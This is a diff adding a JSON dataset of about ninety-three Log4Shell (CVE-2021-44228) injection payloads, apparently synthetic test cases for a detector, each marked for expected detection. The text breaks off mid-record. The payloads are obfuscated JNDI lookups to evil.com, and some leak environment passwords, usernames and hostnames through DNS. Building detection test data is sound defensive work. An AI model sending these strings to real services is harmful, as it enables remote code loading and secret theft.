@@ -1,0 +1,1002 @@
+[
+  {
+    "id": "log4j_0000",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "60.132.51.245",
+    "timestamp": "2026-03-13T21:53:09.059932"
+  },
+  {
+    "id": "log4j_0001",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jn${date:}di:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "222.127.161.132",
+    "timestamp": "2026-03-13T21:53:09.059956"
+  },
+  {
+    "id": "log4j_0002",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://${env:USER}.evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "72.65.206.166",
+    "timestamp": "2026-03-13T21:53:09.059963"
+  },
+  {
+    "id": "log4j_0003",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "7.196.7.152",
+    "timestamp": "2026-03-13T21:53:09.059969"
+  },
+  {
+    "id": "log4j_0004",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://${hostName}.evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "185.72.150.154",
+    "timestamp": "2026-03-13T21:53:09.059975"
+  },
+  {
+    "id": "log4j_0005",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${j${sys:log4j:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "29.125.120.184",
+    "timestamp": "2026-03-13T21:53:09.059980"
+  },
+  {
+    "id": "log4j_0006",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "101.208.174.43",
+    "timestamp": "2026-03-13T21:53:09.059985"
+  },
+  {
+    "id": "log4j_0007",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "52.125.81.204",
+    "timestamp": "2026-03-13T21:53:09.059993"
+  },
+  {
+    "id": "log4j_0008",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${j${spring:spring:-n}di:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "113.156.66.92",
+    "timestamp": "2026-03-13T21:53:09.059999"
+  },
+  {
+    "id": "log4j_0009",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "35.191.111.65",
+    "timestamp": "2026-03-13T21:53:09.060004"
+  },
+  {
+    "id": "log4j_0010",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${j${spring:spring:-n}di:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "7.15.222.41",
+    "timestamp": "2026-03-13T21:53:09.060008"
+  },
+  {
+    "id": "log4j_0011",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${what:ever:-j}${what:ever:-n}${what:ever:-d}${what:ever:-i}:${what:ever:-l}${what:ever:-d}${what:ever:-a}${what:ever:-p}://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "16.176.229.23",
+    "timestamp": "2026-03-13T21:53:09.060013"
+  },
+  {
+    "id": "log4j_0012",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${j${k8s:k5:-n}di:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "191.43.38.44",
+    "timestamp": "2026-03-13T21:53:09.060018"
+  },
+  {
+    "id": "log4j_0013",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "79.116.83.117",
+    "timestamp": "2026-03-13T21:53:09.060023"
+  },
+  {
+    "id": "log4j_0014",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${what:ever:-j}${what:ever:-n}${what:ever:-d}${what:ever:-i}:${what:ever:-l}${what:ever:-d}${what:ever:-a}${what:ever:-p}://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "216.255.19.119",
+    "timestamp": "2026-03-13T21:53:09.060027"
+  },
+  {
+    "id": "log4j_0015",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "4.83.118.160",
+    "timestamp": "2026-03-13T21:53:09.060032"
+  },
+  {
+    "id": "log4j_0016",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${what:ever:-j}${what:ever:-n}${what:ever:-d}${what:ever:-i}:${what:ever:-l}${what:ever:-d}${what:ever:-a}${what:ever:-p}://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "99.36.4.95",
+    "timestamp": "2026-03-13T21:53:09.060036"
+  },
+  {
+    "id": "log4j_0017",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "145.218.31.239",
+    "timestamp": "2026-03-13T21:53:09.060040"
+  },
+  {
+    "id": "log4j_0018",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:dns://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "83.178.12.185",
+    "timestamp": "2026-03-13T21:53:09.060045"
+  },
+  {
+    "id": "log4j_0019",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${${${jndi:ldap://evil.com/a}}}}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "73.159.215.105",
+    "timestamp": "2026-03-13T21:53:09.060049"
+  },
+  {
+    "id": "log4j_0020",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${j${sys:log4j:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "24.203.111.71",
+    "timestamp": "2026-03-13T21:53:09.060054"
+  },
+  {
+    "id": "log4j_0021",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:iiop://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "167.125.230.101",
+    "timestamp": "2026-03-13T21:53:09.060059"
+  },
+  {
+    "id": "log4j_0022",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${what:ever:-j}${what:ever:-n}${what:ever:-d}${what:ever:-i}:${what:ever:-l}${what:ever:-d}${what:ever:-a}${what:ever:-p}://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "54.208.41.242",
+    "timestamp": "2026-03-13T21:53:09.060063"
+  },
+  {
+    "id": "log4j_0023",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jn${date:}di:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "204.222.27.116",
+    "timestamp": "2026-03-13T21:53:09.060068"
+  },
+  {
+    "id": "log4j_0024",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:dns://${sys:user.home}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "86.232.75.242",
+    "timestamp": "2026-03-13T21:53:09.060072"
+  },
+  {
+    "id": "log4j_0025",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:iiop://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "95.53.149.62",
+    "timestamp": "2026-03-13T21:53:09.060080"
+  },
+  {
+    "id": "log4j_0026",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${what:ever:-j}${what:ever:-n}${what:ever:-d}${what:ever:-i}:${what:ever:-l}${what:ever:-d}${what:ever:-a}${what:ever:-p}://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "164.8.195.151",
+    "timestamp": "2026-03-13T21:53:09.060085"
+  },
+  {
+    "id": "log4j_0027",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://${sys:java.version}.evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "218.204.183.8",
+    "timestamp": "2026-03-13T21:53:09.060090"
+  },
+  {
+    "id": "log4j_0028",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "216.18.138.35",
+    "timestamp": "2026-03-13T21:53:09.060094"
+  },
+  {
+    "id": "log4j_0029",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${j${k8s:k5:-n}di:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "32.179.76.139",
+    "timestamp": "2026-03-13T21:53:09.060099"
+  },
+  {
+    "id": "log4j_0030",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:dns://${env:PASSWORD}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "201.156.126.71",
+    "timestamp": "2026-03-13T21:53:09.060103"
+  },
+  {
+    "id": "log4j_0031",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "92.181.251.125",
+    "timestamp": "2026-03-13T21:53:09.060108"
+  },
+  {
+    "id": "log4j_0032",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "208.93.186.79",
+    "timestamp": "2026-03-13T21:53:09.060113"
+  },
+  {
+    "id": "log4j_0033",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:dns://${sys:user.home}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "88.146.216.147",
+    "timestamp": "2026-03-13T21:53:09.060118"
+  },
+  {
+    "id": "log4j_0034",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jn${date:}di:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "32.111.26.23",
+    "timestamp": "2026-03-13T21:53:09.060122"
+  },
+  {
+    "id": "log4j_0035",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://${hostName}.evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "148.69.35.22",
+    "timestamp": "2026-03-13T21:53:09.060129"
+  },
+  {
+    "id": "log4j_0036",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "162.5.245.245",
+    "timestamp": "2026-03-13T21:53:09.060134"
+  },
+  {
+    "id": "log4j_0037",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:dns://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "209.48.137.135",
+    "timestamp": "2026-03-13T21:53:09.060139"
+  },
+  {
+    "id": "log4j_0038",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${lower:${upper:j}}ndi:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "117.67.223.46",
+    "timestamp": "2026-03-13T21:53:09.060144"
+  },
+  {
+    "id": "log4j_0039",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "94.46.248.110",
+    "timestamp": "2026-03-13T21:53:09.060148"
+  },
+  {
+    "id": "log4j_0040",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "147.132.71.243",
+    "timestamp": "2026-03-13T21:53:09.060153"
+  },
+  {
+    "id": "log4j_0041",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://${sys:java.version}.evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "125.125.17.181",
+    "timestamp": "2026-03-13T21:53:09.060157"
+  },
+  {
+    "id": "log4j_0042",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${j${spring:spring:-n}di:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "165.228.44.119",
+    "timestamp": "2026-03-13T21:53:09.060162"
+  },
+  {
+    "id": "log4j_0043",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://127.0.0.1:1389/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "88.46.46.242",
+    "timestamp": "2026-03-13T21:53:09.060167"
+  },
+  {
+    "id": "log4j_0044",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${j${sys:log4j:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "105.6.38.52",
+    "timestamp": "2026-03-13T21:53:09.060174"
+  },
+  {
+    "id": "log4j_0045",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://127.0.0.1:1389/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "212.90.227.217",
+    "timestamp": "2026-03-13T21:53:09.060181"
+  },
+  {
+    "id": "log4j_0046",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "126.199.88.107",
+    "timestamp": "2026-03-13T21:53:09.060186"
+  },
+  {
+    "id": "log4j_0047",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "55.46.123.230",
+    "timestamp": "2026-03-13T21:53:09.060190"
+  },
+  {
+    "id": "log4j_0048",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${j${sys:log4j:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "92.247.221.244",
+    "timestamp": "2026-03-13T21:53:09.060195"
+  },
+  {
+    "id": "log4j_0049",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "124.126.254.243",
+    "timestamp": "2026-03-13T21:53:09.060200"
+  },
+  {
+    "id": "log4j_0050",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${${${jndi:ldap://evil.com/a}}}}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "147.57.171.87",
+    "timestamp": "2026-03-13T21:53:09.060204"
+  },
+  {
+    "id": "log4j_0051",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "137.145.196.183",
+    "timestamp": "2026-03-13T21:53:09.060209"
+  },
+  {
+    "id": "log4j_0052",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "12.223.82.220",
+    "timestamp": "2026-03-13T21:53:09.060213"
+  },
+  {
+    "id": "log4j_0053",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "100.108.157.86",
+    "timestamp": "2026-03-13T21:53:09.060218"
+  },
+  {
+    "id": "log4j_0054",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jn${date:}di:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "120.65.6.33",
+    "timestamp": "2026-03-13T21:53:09.060223"
+  },
+  {
+    "id": "log4j_0055",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${j${k8s:k5:-n}di:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "167.143.222.189",
+    "timestamp": "2026-03-13T21:53:09.060227"
+  },
+  {
+    "id": "log4j_0056",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${${${jndi:ldap://evil.com/a}}}}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "164.27.223.123",
+    "timestamp": "2026-03-13T21:53:09.060234"
+  },
+  {
+    "id": "log4j_0057",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://${sys:java.version}.evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "71.110.7.9",
+    "timestamp": "2026-03-13T21:53:09.060239"
+  },
+  {
+    "id": "log4j_0058",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:dns://${env:PASSWORD}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "203.181.238.51",
+    "timestamp": "2026-03-13T21:53:09.060244"
+  },
+  {
+    "id": "log4j_0059",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:rmi://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "56.112.28.167",
+    "timestamp": "2026-03-13T21:53:09.060248"
+  },
+  {
+    "id": "log4j_0060",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${j${k8s:k5:-n}di:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "131.162.220.229",
+    "timestamp": "2026-03-13T21:53:09.060253"
+  },
+  {
+    "id": "log4j_0061",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${what:ever:-j}${what:ever:-n}${what:ever:-d}${what:ever:-i}:${what:ever:-l}${what:ever:-d}${what:ever:-a}${what:ever:-p}://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "163.104.63.227",
+    "timestamp": "2026-03-13T21:53:09.060257"
+  },
+  {
+    "id": "log4j_0062",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${${${jndi:ldap://evil.com/a}}}}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "183.95.20.238",
+    "timestamp": "2026-03-13T21:53:09.060262"
+  },
+  {
+    "id": "log4j_0063",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:dns://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "117.31.67.6",
+    "timestamp": "2026-03-13T21:53:09.060266"
+  },
+  {
+    "id": "log4j_0064",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "11.19.141.172",
+    "timestamp": "2026-03-13T21:53:09.060274"
+  },
+  {
+    "id": "log4j_0065",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:dns://${env:PASSWORD}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "140.157.204.117",
+    "timestamp": "2026-03-13T21:53:09.060278"
+  },
+  {
+    "id": "log4j_0066",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${j${k8s:k5:-n}di:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "118.167.209.237",
+    "timestamp": "2026-03-13T21:53:09.060283"
+  },
+  {
+    "id": "log4j_0067",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:dns://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "193.73.246.182",
+    "timestamp": "2026-03-13T21:53:09.060287"
+  },
+  {
+    "id": "log4j_0068",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:dns://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "168.6.107.184",
+    "timestamp": "2026-03-13T21:53:09.060292"
+  },
+  {
+    "id": "log4j_0069",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:dns://${env:PASSWORD}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "153.55.105.17",
+    "timestamp": "2026-03-13T21:53:09.060297"
+  },
+  {
+    "id": "log4j_0070",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://${env:USER}.evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "49.60.128.74",
+    "timestamp": "2026-03-13T21:53:09.060301"
+  },
+  {
+    "id": "log4j_0071",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "38.182.21.25",
+    "timestamp": "2026-03-13T21:53:09.060306"
+  },
+  {
+    "id": "log4j_0072",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${j${sys:log4j:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "185.207.124.152",
+    "timestamp": "2026-03-13T21:53:09.060310"
+  },
+  {
+    "id": "log4j_0073",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://${hostName}.evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "83.134.155.240",
+    "timestamp": "2026-03-13T21:53:09.060315"
+  },
+  {
+    "id": "log4j_0074",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "92.156.69.40",
+    "timestamp": "2026-03-13T21:53:09.060319"
+  },
+  {
+    "id": "log4j_0075",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${j${k8s:k5:-n}di:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "22.182.178.200",
+    "timestamp": "2026-03-13T21:53:09.060324"
+  },
+  {
+    "id": "log4j_0076",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${what:ever:-j}${what:ever:-n}${what:ever:-d}${what:ever:-i}:${what:ever:-l}${what:ever:-d}${what:ever:-a}${what:ever:-p}://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "66.109.63.211",
+    "timestamp": "2026-03-13T21:53:09.060328"
+  },
+  {
+    "id": "log4j_0077",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:iiop://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "220.44.75.82",
+    "timestamp": "2026-03-13T21:53:09.060336"
+  },
+  {
+    "id": "log4j_0078",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "102.151.238.129",
+    "timestamp": "2026-03-13T21:53:09.060341"
+  },
+  {
+    "id": "log4j_0079",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "72.180.209.33",
+    "timestamp": "2026-03-13T21:53:09.060345"
+  },
+  {
+    "id": "log4j_0080",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:dns://${sys:user.home}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "127.125.213.139",
+    "timestamp": "2026-03-13T21:53:09.060350"
+  },
+  {
+    "id": "log4j_0081",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "86.174.17.59",
+    "timestamp": "2026-03-13T21:53:09.060354"
+  },
+  {
+    "id": "log4j_0082",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:iiop://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "24.77.254.76",
+    "timestamp": "2026-03-13T21:53:09.060359"
+  },
+  {
+    "id": "log4j_0083",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:dns://${sys:user.home}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "67.93.106.128",
+    "timestamp": "2026-03-13T21:53:09.060364"
+  },
+  {
+    "id": "log4j_0084",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:iiop://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "104.177.7.172",
+    "timestamp": "2026-03-13T21:53:09.060371"
+  },
+  {
+    "id": "log4j_0085",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:dns://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "16.143.74.162",
+    "timestamp": "2026-03-13T21:53:09.060376"
+  },
+  {
+    "id": "log4j_0086",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "122.148.28.9",
+    "timestamp": "2026-03-13T21:53:09.060380"
+  },
+  {
+    "id": "log4j_0087",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${lower:${upper:j}}ndi:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "199.181.122.51",
+    "timestamp": "2026-03-13T21:53:09.060385"
+  },
+  {
+    "id": "log4j_0088",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://${hostName}.evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "131.109.169.120",
+    "timestamp": "2026-03-13T21:53:09.060390"
+  },
+  {
+    "id": "log4j_0089",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "15.13.210.23",
+    "timestamp": "2026-03-13T21:53:09.060394"
+  },
+  {
+    "id": "log4j_0090",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "55.145.13.248",
+    "timestamp": "2026-03-13T21:53:09.060399"
+  },
+  {
+    "id": "log4j_0091",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${jndi:dns://${sys:user.home}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "152.235.127.82",
+    "timestamp": "2026-03-13T21:53:09.060403"
+  },
+  {
+    "id": "log4j_0092",
+    "type": "log4j_injection",
+    "cve": "CVE-2021-44228",
+    "payload": "${j${sys:log4j:ldap://evil.com/a}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "135.177.81.208",
